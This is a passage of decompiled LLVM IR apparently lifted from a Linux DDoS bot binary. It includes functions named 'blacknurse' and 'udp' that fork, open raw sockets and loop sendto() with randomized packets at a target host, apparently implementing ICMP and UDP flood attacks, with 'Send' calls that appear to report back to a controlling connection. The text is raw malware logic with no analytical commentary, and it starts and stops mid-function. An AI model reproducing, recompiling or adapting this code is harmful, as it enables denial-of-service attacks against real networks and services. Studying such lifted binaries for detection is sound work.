dec_label_pc_804b227:                             ; preds = %dec_label_pc_804b143, %dec_label_pc_804b1b3
  br label %dec_label_pc_804b22a.outer

dec_label_pc_804b22a.outer:                       ; preds = %dec_label_pc_804b227, %dec_label_pc_804afa0
  br label %dec_label_pc_804b22a

dec_label_pc_804b22a:                             ; preds = %dec_label_pc_804b22a.outer, %dec_label_pc_804b0e9
  %v4_804b236 = call i32 @fgets(i32 %v0_804b056, i32 128, i32 %v3_804b0b1)
  store i32 %v4_804b236, i32* %eax.global-to-local, align 4
  %v1_804b23e = icmp eq i32 %v4_804b236, 0
  %v1_804b240 = icmp eq i1 %v1_804b23e, false
  br i1 %v1_804b240, label %dec_label_pc_804b0c1, label %dec_label_pc_804b246

dec_label_pc_804b246:                             ; preds = %dec_label_pc_804b22a
  %v0_804b246 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804b246, i32* %eax.global-to-local, align 4
  %v1_804b24b = add i32 %v0_804b246, 532
  %v2_804b24b = inttoptr i32 %v1_804b24b to i32*
  %v3_804b24b = load i32, i32* %v2_804b24b, align 4
  %v2_804b257 = mul i32 %v2_804b067, 4
  %v1_804b25d = add i32 %v2_804b257, 30
  %v2_804b260 = and i32 %v1_804b25d, -16
  %v2_804b266 = sub i32 %v12_804afd8.pre-phi, %v2_804b260
  %v1_804b274 = add i32 %v2_804b266, 15
  %v2_804b277 = and i32 %v1_804b274, -16
  %v1_804b298 = add i32 %arg4, 4
  store i32 %v1_804b298, i32* %eax.global-to-local, align 4
  %v1_804b29b = inttoptr i32 %v1_804b298 to i32*
  %v2_804b29b = load i32, i32* %v1_804b29b, align 4
  store i32 %v2_804b29b, i32* %eax.global-to-local, align 4
  %v2_804b2a0 = add i32 %v2_804b266, -16
  %v3_804b2a0 = inttoptr i32 %v2_804b2a0 to i32*
  store i32 %v2_804b29b, i32* %v3_804b2a0, align 4
  %v1_804b2a1 = call i32 @inet_addr(i32 %v2_804b277)
  %v0_804b2a6 = load i32, i32* @esp, align 4
  store i32 %v2_804b257, i32* %edx.global-to-local, align 4
  %v2_804b2c0 = mul i32 %v2_804b067, 28
  %v1_804b2c5 = add i32 %v2_804b2c0, 30
  %v2_804b2c8 = and i32 %v1_804b2c5, -16
  %v1_804b2a6 = sub i32 16, %v2_804b2c8
  %v2_804b2ce = add i32 %v1_804b2a6, %v0_804b2a6
  %v1_804b2dc = add i32 %v2_804b2ce, 15
  %v2_804b2df = and i32 %v1_804b2dc, -16
  store i32 %v2_804b2df, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b3b167 = icmp sgt i32 %v2_804b067, 0
  br i1 %v5_804b3b167, label %dec_label_pc_804b300.lr.ph, label %dec_label_pc_804b3b7

dec_label_pc_804b300.lr.ph:                       ; preds = %dec_label_pc_804b246
  %v3_804b334 = or i32 %v2_804b2df, 8
  %v3_804b36f = or i32 %v2_804b2df, 4
  br label %dec_label_pc_804b300

dec_label_pc_804b300:                             ; preds = %dec_label_pc_804b300, %dec_label_pc_804b300.lr.ph
  %storemerge668 = phi i32 [ 0, %dec_label_pc_804b300.lr.ph ], [ %v4_804b3a8, %dec_label_pc_804b300 ]
  %v2_804b314 = mul i32 %storemerge668, 28
  %v3_804b319 = add i32 %v2_804b314, %v2_804b2df
  %v4_804b319 = inttoptr i32 %v3_804b319 to i32*
  store i32 %storemerge668, i32* %v4_804b319, align 4
  store i32 %v2_804b2df, i32* %ecx.global-to-local, align 4
  %v2_804b322 = mul i32 %storemerge668, 4
  store i32 %v2_804b314, i32* %edx.global-to-local, align 4
  %v4_804b334 = add i32 %v3_804b334, %v2_804b314
  %v5_804b334 = inttoptr i32 %v4_804b334 to i32*
  store i32 2, i32* %v5_804b334, align 4
  %v1_804b33e = load i32, i32* %edx.global-to-local, align 4
  %v2_804b33e = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b33e = add i32 %v1_804b33e, 12
  %v4_804b33e = add i32 %v3_804b33e, %v2_804b33e
  %v5_804b33e = inttoptr i32 %v4_804b33e to i32*
  store i32 %v1_804b2a1, i32* %v5_804b33e, align 4
  %v1_804b348 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b348 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b348 = add i32 %v1_804b348, 16
  %v4_804b348 = add i32 %v3_804b348, %v2_804b348
  %v5_804b348 = inttoptr i32 %v4_804b348 to i32*
  %v1_804b352 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b352 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804b352 = add i32 %v1_804b352, 20
  %v4_804b352 = add i32 %v3_804b352, %v2_804b352
  %v5_804b352 = inttoptr i32 %v4_804b352 to i32*
  %v4_804b36f = add i32 %v3_804b36f, %v2_804b314
  %v5_804b36f = inttoptr i32 %v4_804b36f to i32*
  store i32 %v3_804b24b, i32* %v5_804b36f, align 4
  store i32 %v3_804b319, i32* @ecx, align 4
  store i32 %v2_804b277, i32* %edx.global-to-local, align 4
  %v2_804b394 = add i32 %v2_804b322, %v2_804b277
  store i32 %v2_804b394, i32* %eax.global-to-local, align 4
  %v1_804b397 = load i32, i32* @esp, align 4
  %v2_804b397 = add i32 %v1_804b397, -4
  %v3_804b397 = inttoptr i32 %v2_804b397 to i32*
  store i32 %v3_804b319, i32* %v3_804b397, align 4
  %v1_804b398 = add i32 %v1_804b397, -8
  %v2_804b398 = inttoptr i32 %v1_804b398 to i32*
  store i32 134524074, i32* %v2_804b398, align 4
  %v1_804b39d = add i32 %v1_804b397, -12
  %v2_804b39d = inttoptr i32 %v1_804b39d to i32*
  store i32 0, i32* %v2_804b39d, align 4
  %v0_804b39f = load i32, i32* %eax.global-to-local, align 4
  %v2_804b39f = add i32 %v1_804b397, -16
  %v3_804b39f = inttoptr i32 %v2_804b39f to i32*
  store i32 %v0_804b39f, i32* %v3_804b39f, align 4
  %v4_804b3a0 = inttoptr i32 %storemerge668 to i32*
  %v5_804b3a0 = call i32 @pthread_create(i32* %v4_804b3a0, i32 128, i32 %v0_804b056, i32 %v2_804b067)
  %v0_804b3a5 = load i32, i32* @esp, align 4
  %v1_804b3a5 = add i32 %v0_804b3a5, 16
  %v4_804b3a8 = add nuw nsw i32 %storemerge668, 1
  store i32 %v4_804b3a8, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b3a8, %v2_804b067
  br i1 %exitcond, label %dec_label_pc_804b3b7, label %dec_label_pc_804b300

dec_label_pc_804b3b7:                             ; preds = %dec_label_pc_804b300, %dec_label_pc_804b246
  %v0_804b3c7.lcssa = phi i32 [ %v2_804b2ce, %dec_label_pc_804b246 ], [ %v1_804b3a5, %dec_label_pc_804b300 ]
  %storemerge6.lcssa = phi i32 [ 0, %dec_label_pc_804b246 ], [ %v2_804b067, %dec_label_pc_804b300 ]
  %v1_804b3ba = add i32 %arg4, 8
  store i32 %v1_804b3ba, i32* %eax.global-to-local, align 4
  %v1_804b3bd = inttoptr i32 %v1_804b3ba to i32*
  %v2_804b3bd = load i32, i32* %v1_804b3bd, align 4
  store i32 %v2_804b3bd, i32* %edx.global-to-local, align 4
  store i32 %v1_804b298, i32* %eax.global-to-local, align 4
  %v2_804b3c5 = load i32, i32* %v1_804b29b, align 4
  store i32 %v2_804b3c5, i32* %eax.global-to-local, align 4
  %v2_804b3ca = add i32 %v0_804b3c7.lcssa, -16
  %v3_804b3ca = inttoptr i32 %v2_804b3ca to i32*
  store i32 %v2_804b3bd, i32* %v3_804b3ca, align 4
  %v0_804b3cb = load i32, i32* %eax.global-to-local, align 4
  %v2_804b3cb = add i32 %v0_804b3c7.lcssa, -20
  %v3_804b3cb = inttoptr i32 %v2_804b3cb to i32*
  store i32 %v0_804b3cb, i32* %v3_804b3cb, align 4
  %v5_804b3cc = add i32 %v0_804b3c7.lcssa, -24
  %v6_804b3cc = inttoptr i32 %v5_804b3cc to i32*
  store i32 %arg2, i32* %v6_804b3cc, align 4
  %v1_804b3cf = add i32 %v0_804b3c7.lcssa, -28
  %v2_804b3cf = inttoptr i32 %v1_804b3cf to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_8069580.148 to i32), i32* %v2_804b3cf, align 4
  %v5_804b3d4 = add i32 %v0_804b3c7.lcssa, -32
  %v6_804b3d4 = inttoptr i32 %v5_804b3d4 to i32*
  store i32 %arg1, i32* %v6_804b3d4, align 4
  %v2_804b3d7 = call i32 @Send(i32 %storemerge6.lcssa, i32 128)
  %v0_804b3dc = load i32, i32* @esp, align 4
  %v0_804b3df = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804b3df = ptrtoint i8* %v0_804b3df to i32
  store i32 %v1_804b3df, i32* %eax.global-to-local, align 4
  %v2_804b3e4 = add i32 %v0_804b3dc, 28
  %v3_804b3e4 = inttoptr i32 %v2_804b3e4 to i32*
  store i32 %v1_804b3df, i32* %v3_804b3e4, align 4
  %v1_804b3e5 = add i32 %v0_804b3dc, 24
  %v2_804b3e5 = inttoptr i32 %v1_804b3e5 to i32*
  store i32 18, i32* %v2_804b3e5, align 4
  %v1_804b3e7 = add i32 %v0_804b3dc, 20
  %v2_804b3e7 = inttoptr i32 %v1_804b3e7 to i32*
  store i32 1, i32* %v2_804b3e7, align 4
  %v1_804b3e9 = add i32 %v0_804b3dc, 16
  %v2_804b3e9 = inttoptr i32 %v1_804b3e9 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_80695a4.149 to i32), i32* %v2_804b3e9, align 4
  %v4_804b3ee = call i32 @fwrite(i32 %storemerge6.lcssa, i32 128, i32 %v0_804b056, i32 %v2_804b067)
  store i32 %v4_804b3ee, i32* %eax.global-to-local, align 4
  %v0_804b3f3 = load i32, i32* @esp, align 4
  %v1_804b4af = add i32 %arg4, 24
  %v1_804b4b2 = inttoptr i32 %v1_804b4af to i32*
  br label %dec_label_pc_804b4ac

dec_label_pc_804b402:                             ; preds = %dec_label_pc_804b4ac
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804b430 = inttoptr i32 %v0_804b4bd to i32*
  store i32 50000, i32* %v3_804b430, align 4
  %v1_804b431 = sext i32 %storemerge to i64
  %v2_804b431 = call i32 @usleep(i64 %v1_804b431)
  %v0_804b436 = load i32, i32* @esp, align 4
  %v0_804b439 = load i64, i64* @global_var_807cc80.96, align 8
  %sext = mul i64 %v0_804b439, 4294967296
  %v2_804b442 = sdiv i64 %sext, 4294967296
  %v4_804b442 = mul nsw i64 %v2_804b442, 20
  %v5_804b442 = trunc i64 %v4_804b442 to i32
  store i32 %v5_804b442, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804b442, %v2_804b07e
  %v0_804b471 = load i32, i32* @global_var_807cb68.97, align 8
  store i32 %v0_804b471, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804b44c, label %dec_label_pc_804b471

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b402
  %tmp60 = icmp slt i32 %v0_804b471, 1
  %tmp61 = icmp eq i1 %tmp60, false
  br i1 %tmp61, label %dec_label_pc_804b464, label %dec_label_pc_804b455

dec_label_pc_804b455:                             ; preds = %dec_label_pc_804b44c
  %v0_804b455 = load i32, i32* @global_var_806f718.98, align 8
  %v1_804b45a = add i32 %v0_804b455, 100
  store i32 %v1_804b45a, i32* %eax.global-to-local, align 4
  store i32 %v1_804b45a, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804b49f

dec_label_pc_804b464:                             ; preds = %dec_label_pc_804b44c
  %v1_804b469 = add i32 %v0_804b471, -1
  store i32 %v1_804b469, i32* %eax.global-to-local, align 4
  store i32 %v1_804b469, i32* @global_var_807cb68.97, align 8
  br label %dec_label_pc_804b49f

dec_label_pc_804b471:                             ; preds = %dec_label_pc_804b402
  %v1_804b476 = add i32 %v0_804b471, 1
  store i32 %v1_804b476, i32* @global_var_807cb68.97, align 8
  %v0_804b47c = load i32, i32* @global_var_806f718.98, align 8
  store i32 %v0_804b47c, i32* %eax.global-to-local, align 4
  %v1_804b481 = add i32 %v0_804b47c, -25
  %v5_804b481 = icmp ult i32 %v0_804b47c, 25
  %v9_804b481 = icmp eq i32 %v1_804b481, 0
  %v2_804b484 = or i1 %v5_804b481, %v9_804b481
  br i1 %v2_804b484, label %dec_label_pc_804b495, label %dec_label_pc_804b486

dec_label_pc_804b486:                             ; preds = %dec_label_pc_804b471
  store i32 %v1_804b481, i32* %eax.global-to-local, align 4
  store i32 %v1_804b481, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804b49f

dec_label_pc_804b495:                             ; preds = %dec_label_pc_804b471
  store i32 0, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804b49f

dec_label_pc_804b49f:                             ; preds = %dec_label_pc_804b486, %dec_label_pc_804b464, %dec_label_pc_804b455, %dec_label_pc_804b495
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v4_804b4a9 = add i32 %storemerge, 1
  br label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b3b7, %dec_label_pc_804b49f
  %v0_804b4b4.in = phi i32 [ %v0_804b436, %dec_label_pc_804b49f ], [ %v0_804b3f3, %dec_label_pc_804b3b7 ]
  %storemerge = phi i32 [ %v4_804b4a9, %dec_label_pc_804b49f ], [ 0, %dec_label_pc_804b3b7 ]
  store i32 %v1_804b4af, i32* %eax.global-to-local, align 4
  %v2_804b4b2 = load i32, i32* %v1_804b4b2, align 4
  store i32 %v2_804b4b2, i32* %eax.global-to-local, align 4
  %v3_804b4b7 = inttoptr i32 %v0_804b4b4.in to i32*
  store i32 %v2_804b4b2, i32* %v3_804b4b7, align 4
  %v1_804b4b8 = call i32 @atol(i32 %storemerge)
  %v0_804b4bd = load i32, i32* @esp, align 4
  %v9_804b4c0 = mul i32 %v1_804b4b8, 20
  store i32 %v9_804b4c0, i32* %eax.global-to-local, align 4
  %v8_804b4c7 = icmp sgt i32 %v9_804b4c0, %storemerge
  br i1 %v8_804b4c7, label %dec_label_pc_804b402, label %dec_label_pc_804b4cd

dec_label_pc_804b4cd:                             ; preds = %dec_label_pc_804b4ac
  %v2_804b4d0 = inttoptr i32 %v0_804b4bd to i32*
  store i32 0, i32* %v2_804b4d0, align 4
  %v1_804b4d2 = call i32 @__GI_exit(i32 %storemerge)
  store i32 %v1_804b4d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b4d7

dec_label_pc_804b4d7:                             ; preds = %entry, %dec_label_pc_804b4cd
  %v0_804b4e4 = phi i32 [ %v1_804af43, %entry ], [ %v1_804b4d2, %dec_label_pc_804b4cd ]
  ret i32 %v0_804b4e4

; uselistorder directives
  uselistorder i32 %v9_804b4c0, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v1_804b481, { 1, 0, 2 }
  uselistorder i32 %v0_804b471, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804b4af, { 1, 0 }
  uselistorder i32 %storemerge6.lcssa, { 1, 0 }
  uselistorder i32 %v2_804b314, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge668, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v2_804b2df, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v2_804b277, { 0, 2, 1 }
  uselistorder i32 %v0_804b1a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804b18f, { 1, 0 }
  uselistorder i32 %v2_804b1bb, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804b067, { 4, 0, 1, 5, 2, 6, 3 }
  uselistorder i32 %v0_804b056, { 3, 4, 11, 7, 6, 8, 1, 5, 2, 0, 9, 10 }
  uselistorder i32 %v2_804b03c, { 2, 1, 0 }
  uselistorder i32 %v4_804af7a, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 7, 8, 9, 1, 2, 4, 5, 3, 6, 10, 11, 12, 13, 14, 15, 18, 16, 17, 62, 19, 20, 21, 40, 22, 23, 24, 25, 27, 28, 29, 30, 31, 26, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 540, { 0, 6, 3, 1, 7, 4, 2, 8, 5 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b4d7, { 1, 0 }
  uselistorder label %dec_label_pc_804b4ac, { 1, 0 }
  uselistorder label %dec_label_pc_804b49f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b227, { 1, 0 }
  uselistorder label %dec_label_pc_804afa0, { 1, 0 }
  uselistorder label %dec_label_pc_804af7a, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v2_804b4f1 = ptrtoint i32* %stack_var_-92 to i32
  %tmp52 = bitcast i32* %stack_var_-92 to i8*
  store i32 %v2_804b4f1, i32* @edi, align 4
  store i32 ptrtoint (i8** @global_var_80695c0.150 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804b501 = call i8* @_memcpy(i8* %tmp52, i8* bitcast (i8** @global_var_80695c0.150 to i8*), i32 9)
  %v2_804b50f = call i32 @__GI_time(i32* null)
  store i32 %v2_804b50f, i32* @eax, align 4
  %v1_804b520 = call i32 @mfork(i32 %arg2)
  %v1_804b528 = icmp eq i32 %v1_804b520, 0
  %v1_804b52a = icmp eq i1 %v1_804b528, false
  br i1 %v1_804b52a, label %dec_label_pc_804b739, label %dec_label_pc_804b530

dec_label_pc_804b530:                             ; preds = %entry
  %v3_804b53c = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804b547 = icmp slt i32 %v3_804b53c, 0
  %v1_804b54b = icmp eq i1 %v5_804b547, false
  br i1 %v1_804b54b, label %dec_label_pc_804b557, label %dec_label_pc_804b54d

dec_label_pc_804b54d:                             ; preds = %dec_label_pc_804b530
  %v1_804b552 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b557

dec_label_pc_804b557:                             ; preds = %dec_label_pc_804b530, %dec_label_pc_804b54d
  %v4_804b557 = add i32 %arg3, -1
  %v9_804b557 = sub i32 0, %arg3
  %v10_804b557 = and i32 %arg3, %v9_804b557
  %v11_804b557 = icmp slt i32 %v10_804b557, 0
  %v12_804b557 = icmp eq i32 %v4_804b557, 0
  %v13_804b557 = icmp slt i32 %v4_804b557, 0
  %v3_804b55b = icmp eq i1 %v13_804b557, %v11_804b557
  %v4_804b55b = icmp eq i1 %v12_804b557, false
  %v5_804b55b = and i1 %v4_804b55b, %v3_804b55b
  br i1 %v5_804b55b, label %dec_label_pc_804b557.dec_label_pc_804b57d_crit_edge, label %dec_label_pc_804b55d

dec_label_pc_804b557.dec_label_pc_804b57d_crit_edge: ; preds = %dec_label_pc_804b557
  br label %dec_label_pc_804b57d

dec_label_pc_804b55d:                             ; preds = %dec_label_pc_804b557
  %v3_804b56b = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_80695e4.151 to i32))
  %v1_804b578 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b557.dec_label_pc_804b57d_crit_edge, %dec_label_pc_804b55d
  %v1_804b580 = add i32 %arg4, 4
  %v1_804b583 = inttoptr i32 %v1_804b580 to i32*
  %v2_804b583 = load i32, i32* %v1_804b583, align 4
  %v2_804b593 = ptrtoint i32* %stack_var_-128 to i32
  %tmp53 = bitcast i32* %stack_var_-128 to i8*
  store i32 %v2_804b593, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804b5a7 = call i8* @_memset(i8* %tmp53, i32 0, i32 8)
  %v6_804b5a7 = ptrtoint i8* %v5_804b5a7 to i32
  store i32 %v6_804b5a7, i32* @ecx, align 4
  %v2_804b5b0 = ptrtoint i32* %stack_var_-96 to i32
  %v8_804b5ba = inttoptr i32 %v2_804b583 to i8*
  %v7_804b5bd = call i32 @getaddrinfo(i8* %v8_804b5ba, i32 0, i32 %v2_804b593, i32 %v2_804b5b0)
  %v4_804b5c8 = icmp eq i32 %v7_804b5bd, 0
  br i1 %v4_804b5c8, label %dec_label_pc_804b5fe, label %dec_label_pc_804b5ce

dec_label_pc_804b5ce:                             ; preds = %dec_label_pc_804b57d
  %v2_804b5d4 = call i32 @gai_strerror(i32 %v7_804b5bd)
  %v0_804b5dc = load i8*, i8** @global_var_8073d70, align 4
  %v1_804b5dc = ptrtoint i8* %v0_804b5dc to i32
  store i32 %v1_804b5dc, i32* @edx, align 4
  %v5_804b5ec = call i32 @fprintf(i32 %v1_804b5dc, i32 ptrtoint ([24 x i8]* @global_var_806960d.152 to i32), i32 %v2_804b583)
  %v2_804b5f9 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b5fe

dec_label_pc_804b5fe:                             ; preds = %dec_label_pc_804b57d, %dec_label_pc_804b5ce
  %v5_804b607 = call i32 @socket(i32 2, i32 3, i32 1)
  %v13_804b612 = icmp eq i32 %v5_804b607, -1
  %v1_804b616 = icmp eq i1 %v13_804b612, false
  br i1 %v1_804b616, label %dec_label_pc_804b5fe.dec_label_pc_804b632_crit_edge, label %dec_label_pc_804b618

dec_label_pc_804b5fe.dec_label_pc_804b632_crit_edge: ; preds = %dec_label_pc_804b5fe
  br label %dec_label_pc_804b632

dec_label_pc_804b618:                             ; preds = %dec_label_pc_804b5fe
  %v3_804b620 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8069625.153, i32 0, i32 0))
  %v2_804b62d = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b632

dec_label_pc_804b632:                             ; preds = %dec_label_pc_804b5fe.dec_label_pc_804b632_crit_edge, %dec_label_pc_804b618
  %v4_804b640 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_806962c.154 to i32))
  store i32 %v5_804b607, i32* %stack_var_-136, align 4
  %tmp55 = bitcast i32* %stack_var_-136 to %pollfd*
  br label %dec_label_pc_804b65f.outer

dec_label_pc_804b65f.outer:                       ; preds = %dec_label_pc_804b731, %dec_label_pc_804b632
  br label %dec_label_pc_804b65f

dec_label_pc_804b65f:                             ; preds = %dec_label_pc_804b65f.outer, %dec_label_pc_804b6b9
  br label %dec_label_pc_804b668

dec_label_pc_804b668:                             ; preds = %dec_label_pc_804b65f, %dec_label_pc_804b668
  %v4_804b67a59 = phi i32 [ 20, %dec_label_pc_804b65f ], [ %v5_804b677, %dec_label_pc_804b668 ]
  %v5_804b66d = add i32 %v4_804b67a59, %v2_804b4f1
  store i32 %v5_804b66d, i32* @ebx, align 4
  %v0_804b670 = call i32 @random()
  %v1_804b670 = trunc i32 %v0_804b670 to i8
  %v3_804b675 = load i32, i32* @ebx, align 4
  %v4_804b675 = inttoptr i32 %v3_804b675 to i8*
  store i8 %v1_804b670, i8* %v4_804b675, align 1
  %v5_804b677 = add nuw nsw i32 %v4_804b67a59, 1
  %exitcond = icmp eq i32 %v5_804b677, 32
  br i1 %exitcond, label %dec_label_pc_804b680, label %dec_label_pc_804b668

dec_label_pc_804b680:                             ; preds = %dec_label_pc_804b668
  %v3_804b680 = load i32, i32* %stack_var_-96, align 4
  %v1_804b683 = add i32 %v3_804b680, 16
  %v2_804b683 = inttoptr i32 %v1_804b683 to i32*
  %v3_804b683 = load i32, i32* %v2_804b683, align 4
  %v1_804b689 = add i32 %v3_804b680, 20
  %v2_804b689 = inttoptr i32 %v1_804b689 to i32*
  %v3_804b689 = load i32, i32* %v2_804b689, align 4
  store i32 %v5_804b607, i32* %stack_var_-220, align 4
  %v8_804b69c = call i32 @sendto(i32 %v5_804b607, i32 %v2_804b4f1, i32 36, i32 0, i32 %v3_804b689, i32 %v3_804b683)
  %v12_804b6a9 = icmp eq i32 %v8_804b69c, 36
  br i1 %v12_804b6a9, label %dec_label_pc_804b731, label %dec_label_pc_804b6ad

dec_label_pc_804b6ad:                             ; preds = %dec_label_pc_804b680
  %v0_804b6ad = load i32, i32* %stack_var_-220, align 4
  %v1_804b6ad = call i32 @__errno_location(i32 %v0_804b6ad)
  %v1_804b6b2 = inttoptr i32 %v1_804b6ad to i32*
  %v2_804b6b2 = load i32, i32* %v1_804b6b2, align 4
  %v9_804b6b4 = icmp eq i32 %v2_804b6b2, 105
  %v1_804b6b7 = icmp eq i1 %v9_804b6b4, false
  br i1 %v1_804b6b7, label %dec_label_pc_804b6d4, label %dec_label_pc_804b6b9

dec_label_pc_804b6b9:                             ; preds = %dec_label_pc_804b6ad
  %v6_804b6ca = call i32 @__libc_poll(%pollfd* %tmp55, i32 1, i32 1000)
  br label %dec_label_pc_804b65f

dec_label_pc_804b6d4:                             ; preds = %dec_label_pc_804b6ad
  %v3_804b6dc = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8069647.155, i32 0, i32 0))
  %v2_804b6ea = call i32 @close(i32 %v5_804b607)
  %v3_804b6f2 = load i32, i32* %stack_var_-96, align 4
  %v2_804b6f9 = call i32 @freeaddrinfo(i32 %v3_804b6f2)
  br label %dec_label_pc_804b739

dec_label_pc_804b731:                             ; preds = %dec_label_pc_804b680
  br label %dec_label_pc_804b65f.outer

dec_label_pc_804b739:                             ; preds = %entry, %dec_label_pc_804b6d4
  %v0_804b740 = phi i32 [ %v1_804b520, %entry ], [ %v2_804b6f9, %dec_label_pc_804b6d4 ]
  ret i32 %v0_804b740

; uselistorder directives
  uselistorder i32 %v5_804b607, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v4_804b557, { 1, 0 }
  uselistorder i32 %v2_804b4f1, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b739, { 1, 0 }
  uselistorder label %dec_label_pc_804b668, { 1, 0 }
  uselistorder label %dec_label_pc_804b65f, { 1, 0 }
  uselistorder label %dec_label_pc_804b632, { 1, 0 }
  uselistorder label %dec_label_pc_804b5fe, { 1, 0 }
  uselistorder label %dec_label_pc_804b57d, { 1, 0 }
  uselistorder label %dec_label_pc_804b557, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1620 = alloca i32, align 4
  %v2_804b756 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b756, i32* @eax, align 4
  %v1_804b767 = call i32 @mfork(i32 %arg2)
  %v1_804b76f = icmp eq i32 %v1_804b767, 0
  %v1_804b771 = icmp eq i1 %v1_804b76f, false
  br i1 %v1_804b771, label %dec_label_pc_804b9cb, label %dec_label_pc_804b777

dec_label_pc_804b777:                             ; preds = %entry
  %v3_804b783 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804b78e = icmp slt i32 %v3_804b783, 0
  %v1_804b792 = icmp eq i1 %v5_804b78e, false
  br i1 %v1_804b792, label %dec_label_pc_804b79e, label %dec_label_pc_804b794

dec_label_pc_804b794:                             ; preds = %dec_label_pc_804b777
  %v1_804b799 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b79e

dec_label_pc_804b79e:                             ; preds = %dec_label_pc_804b777, %dec_label_pc_804b794
  %v4_804b79e = add i32 %arg3, -2
  %v9_804b79e = sub i32 1, %arg3
  %v10_804b79e = and i32 %v9_804b79e, %arg3
  %v11_804b79e = icmp slt i32 %v10_804b79e, 0
  %v12_804b79e = icmp eq i32 %v4_804b79e, 0
  %v13_804b79e = icmp slt i32 %v4_804b79e, 0
  %v3_804b7a2 = icmp eq i1 %v13_804b79e, %v11_804b79e
  %v4_804b7a2 = icmp eq i1 %v12_804b79e, false
  %v5_804b7a2 = and i1 %v4_804b7a2, %v3_804b7a2
  br i1 %v5_804b7a2, label %dec_label_pc_804b79e.dec_label_pc_804b7c4_crit_edge, label %dec_label_pc_804b7a4

dec_label_pc_804b79e.dec_label_pc_804b7c4_crit_edge: ; preds = %dec_label_pc_804b79e
  br label %dec_label_pc_804b7c4

dec_label_pc_804b7a4:                             ; preds = %dec_label_pc_804b79e
  %v3_804b7b2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8069650.156 to i32))
  %v1_804b7bf = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b7c4

dec_label_pc_804b7c4:                             ; preds = %dec_label_pc_804b79e.dec_label_pc_804b7c4_crit_edge, %dec_label_pc_804b7a4
  %v1_804b7c7 = add i32 %arg4, 4
  %v1_804b7ca = inttoptr i32 %v1_804b7c7 to i32*
  %v2_804b7ca = load i32, i32* %v1_804b7ca, align 4
  %v3_804b7d3 = call i32 @host2ip(i32 %arg2, i32 %v2_804b7ca)
  %v1_804b7e1 = add i32 %arg4, 8
  %v1_804b7e4 = inttoptr i32 %v1_804b7e1 to i32*
  %v2_804b7e4 = load i32, i32* %v1_804b7e4, align 4
  %v1_804b7ea = call i32 @atol(i32 %v2_804b7e4)
  %v1_804b7f8 = add i32 %arg4, 12
